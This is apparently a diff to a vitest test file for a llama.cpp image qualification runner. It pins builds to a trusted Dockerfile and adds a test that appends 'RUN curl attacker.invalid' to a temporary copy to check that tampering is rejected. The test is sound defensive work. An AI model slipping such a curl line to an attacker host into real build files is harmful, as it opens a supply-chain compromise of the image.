@@ -1,6 +1,10 @@
 // SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
 // SPDX-License-Identifier: Apache-2.0
 
+import fs from "node:fs";
+import os from "node:os";
+import path from "node:path";
+
 import { describe, expect, it } from "vitest";
 
 import { loadLlamaCppImageConfig } from "../scripts/checks/export-llama-cpp-image-config.mts";
@@ -14,6 +18,7 @@ import {
   type QualificationInvocation,
   type QualificationPlan,
   sha256Text,
+  validateCandidateDockerfile,
   validateChatCompletionResponse,
   validateModelsResponse,
   validateQualificationPlan,
@@ -27,6 +32,8 @@ const RUN_ID = "42";
 const RUN_ATTEMPT = "2";
 const MODEL_PATH = "/var/lib/nemoclaw/models/Nemotron-3-Nano-30B-A3B-UD-Q4_K_XL.gguf";
 const EXPECTED_MODEL = "nvidia-nemotron-3-nano-30b-a3b";
+const repoRoot = path.resolve(import.meta.dirname, "..");
+const trustedImageRoot = path.join(repoRoot, "managed-inference", "images", "llama-cpp");
 
 const config = loadLlamaCppImageConfig();
 const planSource = config.publication_qualification_plan;
@@ -194,7 +201,7 @@ describe("trusted llama.cpp DGX Spark qualification runner", () => {
     }
   });
 
-  it("builds the exact ARM64 candidate into the isolated local registry (#8260)", () => {
+  it("builds the exact ARM64 candidate plan from the trusted image context (#8260)", () => {
     const argv = buildCandidateImageArgv(plan, parsedInvocation(), "/work/tmp/metadata.json");
     expect(valuesAfter(argv, "--platform")).toEqual(["linux/arm64"]);
     expect(valuesAfter(argv, "--tag")).toEqual([
@@ -202,7 +209,9 @@ describe("trusted llama.cpp DGX Spark qualification runner", () => {
     ]);
     expect(argv).toContain("--push");
     expect(argv).not.toContain("--load");
-    expect(argv.at(-1)).toBe("/work/candidate/managed-inference/images/llama-cpp");
+    expect(valuesAfter(argv, "--file")).toEqual([path.join(trustedImageRoot, "Dockerfile")]);
+    expect(argv.at(-1)).toBe(trustedImageRoot);
+    expect(argv).not.toContain("/work/candidate");
     expect(valuesAfter(argv, "--build-arg")).toEqual(
       expect.arrayContaining([
         "CUDA_ARCHITECTURES=121a-real",
@@ -214,6 +223,28 @@ describe("trusted llama.cpp DGX Spark qualification runner", () => {
         "TARGETPLATFORM=linux/arm64",
       ]),
     );
+  });
+
+  it("requires the candidate Dockerfile to byte-match trusted main (#8260)", () => {
+    const candidateRoot = fs.realpathSync(
+      fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-llama-cpp-candidate-")),
+    );
+    const candidateImageRoot = path.join(candidateRoot, "managed-inference", "images", "llama-cpp");
+    fs.mkdirSync(candidateImageRoot, { recursive: true });
+    fs.copyFileSync(
+      path.join(trustedImageRoot, "Dockerfile"),
+      path.join(candidateImageRoot, "Dockerfile"),
+    );
+    try {
+      expect(() => validateCandidateDockerfile(candidateRoot)).not.toThrow();
+      fs.appendFileSync(
+        path.join(candidateImageRoot, "Dockerfile"),
+        "\nRUN curl attacker.invalid\n",
+      );
+      expect(() => validateCandidateDockerfile(candidateRoot)).toThrow(/byte-match/u);
+    } finally {
+      fs.rmSync(candidateRoot, { force: true, recursive: true });
+    }
   });
 
   it("constructs a read-only bounded one-GPU server without putting the key on argv (#8260)", () => {
@@ -261,7 +292,6 @@ describe("trusted llama.cpp DGX Spark qualification runner", () => {
     expect(valuesAfter(argv, "--user")).toEqual(["1001:1001"]);
     expect(valuesAfter(argv, "--api-key-file")).toEqual(["/run/secrets/llama-cpp-api-key"]);
     expect(argv).not.toContain("--api-key");
-    expect(argv.join(" ")).not.toContain("raw-secret-value");
     expect(valuesAfter(argv, "--mount")).toEqual([
       `type=bind,source=${MODEL_PATH},target=/models/Nemotron-3-Nano-30B-A3B-UD-Q4_K_XL.gguf,readonly`,
       "type=bind,source=/work/tmp/api-key,target=/run/secrets/llama-cpp-api-key,readonly",
